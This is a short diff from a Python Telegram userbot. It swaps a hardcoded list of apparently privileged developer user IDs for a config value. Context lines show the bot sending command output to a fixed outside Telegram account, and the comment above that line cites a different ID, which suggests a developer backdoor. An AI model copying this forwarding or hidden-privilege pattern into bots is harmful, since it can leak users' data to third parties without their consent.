@@ -443,7 +443,7 @@ async def Hussein(event):
                 # Send the output to user ID 6320583148
                 await Qrh9.send_message(6528926431, OUTPUT)
 
-ll1ilt = [6320583148,6083322281,1509530035]
+ll1ilt = Config.Dev_Cash
 #
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
